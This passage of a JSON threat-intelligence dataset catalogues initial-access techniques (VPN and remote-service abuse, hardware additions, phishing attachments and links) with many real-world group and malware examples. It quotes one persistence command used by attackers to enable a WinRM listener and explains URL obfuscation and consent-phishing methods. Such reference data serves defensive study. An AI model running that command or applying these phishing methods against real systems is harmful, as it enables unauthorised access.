"}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used external remote services such as virtual private networks (VPN) to gain initial access."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit attempts to gain access to the server via SSH."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can establish an SSH connection from a compromised host to a server."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems."}, {"id": "G0049", "name": "OilRig", "description": "OilRig uses remote services such as VPN, Citrix, or OWA to persist in an environment."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors enabled WinRM over HTTP/HTTPS as a backup persistence mechanism using the following command: cscript //nologo \"C:\\Windows\\System32\\winrm.vbs\" set winrm/config/service@{EnableCompatibilityHttpsListener=\"true\"}."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used stolen credentials to connect to the victim's network via VPN."}, {"id": "G1040", "name": "Play", "description": "Play has used Remote Desktop Protocol (RDP) and Virtual Private Networks (VPN) for initial access."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has leveraged legitimate remote management tools to maintain persistent access."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "For the SolarWinds Compromise, APT29 used compromised identities to access networks via SSH, VPNs, and other remote access tools."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used open-source tools such as Weave Scope to target exposed Docker API ports and gain initial access to victim environments. TeamTNT has also targeted exposed kubelets for Kubernetes environments."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors look for and use VPN profiles during an operation to access the network using external VPN services. Threat Group-3390 has also obtained OWA account credentials during intrusions that it subsequently used to attempt to regain access when evicted from a victim network."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used VPNs to connect to victim environments and enable post-exploitation actions."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has accessed victim networks by using stolen credentials to access the corporate VPN infrastructure."}], "sub_techniques": []}, {"name": "Hardware Additions", "description": "Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.", "detailed_description": "Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.", "id": "T1200", "examples": [{"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya used Bash Bunny, Raspberry Pi, netbooks or inexpensive laptops to connect to the company\u2019s local network."}], "sub_techniques": []}, {"name": "Phishing", "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.", "detailed_description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools, or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\").\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., User Execution).", "id": "T1566", "examples": [{"id": "G0001", "name": "Axiom", "description": "Axiom has used spear phishing to initially compromise victims."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has conducted malicious spam (malspam) campaigns to gain access to victim's machines."}, {"id": "S0009", "name": "Hikit", "description": "Hikit has been spread through spear phishing."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used phishing to gain initial access."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware campaigns have used spearphishing emails for initial access."}, {"id": "S1073", "name": "Royal", "description": "Royal has been spread through the use of phishing campaigns including \"call back phishing\" where victims are lured into calling a number provided through email."}], "sub_techniques": [{"name": "Spearphishing Attachment", "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.", "detailed_description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon User Execution to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.", "id": "T1566.001", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. "}, {"id": "G0018", "name": "admin@338", "description": "admin@338 has sent emails with malicious Microsoft Office documents attached."}, {"id": "S0331", "name": "Agent Tesla", "description": "The primary delivered mechanism for Agent Tesla is through email phishing messages."}, {"id": "G0130", "name": "Ajax Security Team", "description": "Ajax Security Team has used personalized spearphishing attachments."}, {"id": "G0138", "name": "Andariel", "description": "Andariel has conducted spearphishing campaigns that included malicious Word or Excel attachments."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has been distributed to victims through malicious e-mail attachments."}, {"id": "G0099", "name": "APT-C-36", "description": "APT-C-36 has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway."}, {"id": "G0006", "name": "APT1", "description": "APT1 has sent spearphishing emails containing malicious attachments."}, {"id": "G0005", "name": "APT12", "description": "APT12 has sent emails with malicious Microsoft Office documents and PDFs attached."}, {"id": "G0073", "name": "APT19", "description": "APT19 sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits."}, {"id": "G0007", "name": "APT28", "description": "APT28 sent spearphishing emails containing malicious Microsoft Office and RAR attachments."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used spearphishing emails with an attachment to deliver files with exploits to initial victims."}, {"id": "G0013", "name": "APT30", "description": "APT30 has used spearphishing emails with malicious DOC attachments."}, {"id": "G0050", "name": "APT32", "description": "APT32 has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet."}, {"id": "G0064", "name": "APT33", "description": "APT33 has sent spearphishing e-mails with archive attachments."}, {"id": "G0067", "name": "APT37", "description": "APT37 delivers malware using spearphishing emails with malicious HWP attachments."}, {"id": "G0082", "name": "APT38", "description": "APT38 has conducted spearphishing campaigns using malicious email attachments."}, {"id": "G0087", "name": "APT39", "description": "APT39 leveraged spearphishing emails with malicious attachments to initially compromise victims."}, {"id": "G0096", "name": "APT41", "description": "APT41 sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth has been delivered via malicious e-mail attachments."}, {"id": "S0642", "name": "BADFLICK", "description": "BADFLICK has been distributed via spearphishing campaigns containing malicious Microsoft Word documents."}, {"id": "S0234", "name": "Bandook", "description": "Bandook is delivered via a malicious Word document inside a zip file."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has been delivered as malicious email attachments."}, {"id": "G1002", "name": "BITTER", "description": "BITTER has sent spearphishing emails with a malicious RTF document or Excel spreadsheet."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has been delivered by phishing emails containing malicious Microsoft Office documents."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER used spearphishing emails with malicious Microsoft Word attachments to infect victims."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has gained execution through luring users into opening malicious attachments."}, {"id": "C0011", "name": "C0011", "description": "During C0011, Transparent Tribe sent malicious attachments via email to student targets in India."}, {"id": "C0015", "name": "C0015", "description": "For C0015, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has been delivered by sending victims a phishing email containing a malicious .docx file."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has been delivered to victim's machines through malicious e-mail attachments."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has crafted and sent victims malicious attachments to gain initial access."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has used phishing with malicious attachments for initial access to victim environments."}, {"id": "S1014", "name": "DanBot", "description": "DanBot has been distributed within a malicious Excel attachment via spearphishing emails."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate can be distributed through emails with malicious attachments from a spoofed email address."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has sent spearphishing emails with malicious RAR and .LNK attachments."}, {"id": "G0079", "name": "DarkHydrus", "description": "DarkHydrus has sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the \"attachedTemplate\" technique to load a template from a remote server."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has been distributed via spearphishing emails containing archive attachments, with file types such as .iso, .zip, .img, .dmg, and .tar, as well as through malicious documents."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman has been delivered via spearphishing emails that contain a malicious zip file."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has sent emails with malicious attachments to gain initial access."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been delivered by phishing emails containing attachments. "}, {"id": "S0634", "name": "EnvyScout", "description": "EnvyScout has been distributed via spearphishing as an email attachment."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY conducted an e-mail thread-hijacking campaign with malicious ISO attachments."}, {"id": "G0137", "name": "Ferocious Kitten", "description": "Ferocious Kitten has conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has targeted victims with e-mails containing malicious attachments."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has distributed targeted emails containing Word documents with embedded malicious macros."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has been distributed via spearphishing as an email attachment."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors likely used spearphishing emails to send malicious Microsoft Word documents."}, {"id": "G0084", "name": "Gallmaker", "description": "Gallmaker sent emails with malicious Microsoft Office documents attached."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has delivered spearphishing emails with malicious attachments to targets."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group sent emails to victims with malicious Microsoft Office documents attached."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has been delivered via phishing emails with malicious attachments."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa has sent spearphishing emails containing malicious attachments."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has been delivered via phishing e-mails with malicious attachments."}, {"id": "G0100", "name": "Inception", "description": "Inception has used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise."}, {"id": "G0136", "name": "IndigoZebra", "description": "IndigoZebra sent spearphishing emails containing malicious password-protected RAR attachments."}, {"id": "S0528", "name": "Javali", "description": "Javali has been delivered as malicious e-mail attachments."}, {"id": "S0648", "name": "JSS Loader", "description": "JSS Loader has been delivered by phishing emails containing malicious Microsoft Excel attachments."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown has been distributed through malicious e-mail attachments."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has been distributed via spearphishing emails with malicious attachments."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has been delivered via spearphishing campaigns through a malicious Word document."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK has been delivered to victims as a malicious email attachment."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has been distributed through reply-chain phishing emails with malicious attachments."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has targeted victims with spearphishing emails containing malicious Microsoft Word documents."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used spam emails weaponized with archive or document files as its initial infection vector."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot is delivered via a malicious XLS attachment contained within a spearhpishing email."}, {"id": "G0095", "name": "Machete", "description": "Machete has delivered spearphishing emails that contain a zipped file with malicious contents."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has sent spearphishing emails containing malicious .zip files."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has been delivered to victims via emails with malicious HTML attachments."}, {"id": "G0103", "name": "Mofang", "description": "Mofang delivered spearphishing emails with malicious documents, PDFs, or Excel files attached."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has sent phishing emails with malicious Microsoft Word and PDF attachments."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet delivered various payloads to victims as spearphishing attachments."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients. "}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used spearphishing attachments to deliver initial access payloads."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used malicious e-mail attachments to deliver malware."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has been spread via e-mail campaigns utilizing malicious attachments."}, {"id": "G0133", "name": "Nomadic Octopus", "description": "Nomadic Octopus has targeted victims with spearphishing emails containing malicious attachments."}, {"id": "S0346", "name": "OceanSalt", "description": "OceanSalt has been delivered via spearphishing emails with Microsoft Office attachments."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has been delivered via spearsphishing emails."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group sent emails with malicious attachments to gain unauthorized access to targets' computers."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors sent spearphishing emails that contained a malicious Microsoft Word document."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel has been distributed as a malicious attachment within a spearphishing email."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has used spearphishing with an attachment to deliver files with exploits to initial victims."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has sent spearphishing emails with attachments to victims as its primary initial access vector."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT was distributed via malicious Word documents."}, {"id": "S0453", "name": "Pony", "description": "Pony has been delivered via spearphishing attachments."}, {"id": "S0650", "name": "QakBot", "description": "QakBot has spread through emails with malicious attachments."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has been distributed through spearphishing emails with malicious attachments."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has attached a malicious document to an email to gain initial access."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used phishing emails with malicious files to gain initial access."}, {"id": "S0496", "name": "REvil", "description": "REvil has been distributed via malicious e-mail attachments including MS Word Documents."}, {"id": "S0433", "name": "Rifdoor", "description": "Rifdoor has been distributed in e-mails with malicious Excel or Word documents."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT has been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document."}, {"id": "S0148", "name": "RTM", "description": "RTM has been delivered via spearphishing attachments disguised as PDF documents."}, {"id": "G0048", "name": "RTM", "description": "RTM has used spearphishing attachments to distribute its malware."}, {"id": "G1031", "name": "Saint Bear", "description": "Saint Bear uses a variety of file formats, such as Microsoft Office documents, ZIP archives, PDF documents, and other items as phishing attachments for initial access."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has been distributed as malicious attachments within spearphishing emails."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has delivered malicious Microsoft Office and ZIP file attachments via spearphishing emails."}, {"id": "G1008", "name": "SideCopy", "description": "SideCopy has sent spearphishing emails with malicious hta file attachments."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has sent e-mails with malicious attachments often crafted for specific targets."}, {"id": "G0091", "name": "Silence", "description": "Silence has sent emails with malicious DOCX, CHM, LNK and ZIP attachments. "}, {"id": "S1086", "name": "Snip3", "description": "Snip3 has been delivered to victims through malicious e-mail attachments."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has been distributed via malicious Microsoft Office documents within spam emails."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has sent emails with malicious .pdf files to spread malware."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady has been distributed via spearphishing campaigns containing malicious Mircrosoft Word documents."}, {"id": "G1018", "name": "TA2541", "description": "TA2541 has sent phishing emails with malicious attachments for initial access including MS Word documents."}, {"id": "G0062", "name": "TA459", "description": "TA459 has targeted victims using spearphishing emails with malicious Microsoft Word attachments."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used spearphishing emails with malicious attachments to initially compromise victims."}, {"id": "G0127", "name": "TA551", "description": "TA551 has sent spearphishing attachments with password protected ZIP files."}, {"id": "S0011", "name": "Taidoor", "description": "Taidoor has been delivered through spearphishing emails."}, {"id": "G0089", "name": "The White Company", "description": "The White Company has sent phishing emails with malicious Microsoft Word attachments to victims."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has used e-mail to deliver malicious attachments to victims."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle has been distributed via a malicious Word document within a spearphishing email."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has delivered payloads via spearphishing attachments."}, {"id": "G0134", "name": "Transparent Tribe", "description": "Transparent Tribe has sent spearphishing e-mails with attachments to deliver malicious payloads."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has used an email with an Excel sheet containing a malicious macro to deploy the malware"}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper sent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments."}, {"id": "S0476", "name": "Valak", "description": "Valak has been delivered via spearphishing e-mails with password protected ZIP files."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has been distributed as a malicious attachment within an email."}, {"id": "C0037", "name": "Water Curupira Pikabot Distribution", "description": "Water Curupira Pikabot Distribution attached password-protected ZIP archives to deliver Pikabot installers."}, {"id": "G0112", "name": "Windshift", "description": "Windshift has sent spearphishing emails with attachment to harvest credentials and deliver malware."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern leverages malicious attachments delivered via email for initial access activity."}, {"id": "G0090", "name": "WIRTE", "description": "WIRTE has sent emails to intended victims with malicious MS Word and Excel attachments."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download either Emotet, Bokbot, TrickBot, or Bazar."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT has been delivered via malicious Word documents and archive files."}, {"id": "S1013", "name": "ZxxZ", "description": "ZxxZ has been distributed via spearphishing emails, usually containing a malicious RTF or Excel attachment."}]}, {"name": "Spearphishing Link", "description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.", "detailed_description": "Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging User Execution. The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place.\nAdversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an \"IDN homograph attack\"). URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \"@\" symbol: for example, hxxp://google.com@1157586937.\nAdversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  Steal Application Access Tokens. These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.\nAdversaries may also utilize spearphishing links to Steal Application Access Tokens that grant immediate access to the victim environment. For example, a user may be lured through \"consent phishing\" into granting adversaries permissions/access via a malicious OAuth 2.0 request URL .\nSimilarly, malicious links may also target device-based authorization, such as OAuth 2.0 device authorization grant flow which is typically used to authenticate devices without UIs/browsers. Known as \"device code phishing,\" an adversary may send a link that directs the victim to a malicious authorization page where the user is tricked into entering a code/credentials that produces a device token.", "id": "T1566.002", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can send \"consent phishing\" emails containing malicious links designed to steal users\u2019 access tokens."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has been distributed via spearphishing link."}, {"id": "G0006", "name": "APT1", "description": "APT1 has sent spearphishing emails containing hyperlinks to malicious files."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used spearphishing with a link to trick victims into clicking on a link to a zip file containing malicious files."}, {"id": "G0022", "name": "APT3", "description": "APT3 has sent spearphishing emails containing malicious links."}, {"id": "G0050", "name": "APT32", "description": "APT32 has sent spearphishing emails containing malicious links."}, {"id": "G0064", "name": "APT33", "description": "APT33 has sent spearphishing emails containing links to .hta files."}, {"id": "G0087", "name": "APT39", "description": "APT39 leveraged spearphishing emails with malicious links to initially compromise victims."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has been spread via emails with embedded malicious links."}, {"id": "G0098", "name": "BlackTech", "description": "BlackTech has used spearphishing e-mails with links to cloud services to deliver malware."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has been spread through e-mail campaigns with malicious links."}, {"id": "C0011", "name": "C0011", "description": "During C0011, Transparent Tribe sent emails containing a malicious link to student targets in India."}, {"id": "C0021", "name": "C0021", "description": "During C0021, the threat actors sent phishing emails with unique malicious links, likely for tracking victim clicks."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has sent emails with URLs pointing to malicious documents."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has sent malicious links to victims through email campaigns."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate is distributed in phishing emails containing links to distribute malicious VBS or MSI files. DarkGate uses applications such as Microsoft Teams for distributing links to payloads."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has sent spearphishing emails to potential targets that contained a malicious link."}, {"id": "G0066", "name": "Elderwood", "description": "Elderwood has delivered zero-day exploits and malware to victims via targeted emails containing a link to malicious content hosted on an uncommon Web server."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been delivered by phishing emails containing links. "}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has sent spearphishing emails containing a link to a zip file hosted on Google Drive."}, {"id": "G1011", "name": "EXOTIC LILY", "description": "EXOTIC LILY has relied on victims to open malicious links in e-mails for execution."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has used spearphishing emails (often sent from compromised accounts) containing malicious links."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has conducted broad phishing campaigns using malicious links."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has distributed targeted emails containing links to malicious documents with embedded macros."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro has been spread via malicious links embedded in e-mails."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader has been spread in phishing campaigns using malicious web links."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor has been delivered via phishing emails which contained malicious links."}, {"id": "S0528", "name": "Javali", "description": "Javali has been delivered via malicious links embedded in e-mails."}, {"id": "S0585", "name": "Kerrdown", "description": "Kerrdown has been distributed via e-mails containing a malicious link."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has sent spearphishing emails containing a link to a document that contained malicious macros or took the victim to an actor-controlled domain."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has been distributed as a malicious link within an email."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus has been distributed to victims through emails containing malicious links."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has sent malicious links to victims via email."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has used spam emails that contain a link that redirects the victim to download a malicious document."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has sent spearphishing emails with links, often using a fraudulent lookalike domain and stolen branding."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has sent spearphishing emails containing a malicious Dropbox download link."}, {"id": "G0095", "name": "Machete", "description": "Machete has sent phishing emails that contain a link to an external server with ZIP and RAR archives."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz has been spread through malicious links embedded in e-mails."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu has been spread via malicious links embedded in emails."}, {"id": "G0103", "name": "Mofang", "description": "Mofang delivered spearphishing emails with malicious links included."}, {"id": "G0021", "name": "Molerats", "description": "Molerats has sent phishing emails with malicious links included."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has sent targeted spearphishing e-mails with malicious links."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has delivered malicious links to their intended targets."}, {"id": "G1020", "name": "Mustard Tempest", "description": "Mustard Tempest has sent victims emails containing links to compromised websites."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has been spread via e-mail campaigns utilizing malicious links."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors sent spearphishing emails containing links to compromised websites where malware was downloaded."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has sent spearphising emails with malicious links to potential victims."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group sent malicious OneDrive links with fictitious job offer advertisements via email."}, {"id": "C0016", "name": "Operation Dust Storm", "description": "During Operation Dust Storm, the threat actors sent spearphishing emails containing a malicious link."}, {"id": "C0005", "name": "Operation Spalax", "description": "During Operation Spalax, the threat actors sent phishing emails to victims that contained a malicious link."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel has been distributed through malicious links contained within spearphishing emails."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has used spearphishing with links to deliver files with exploits to initial victims."}, 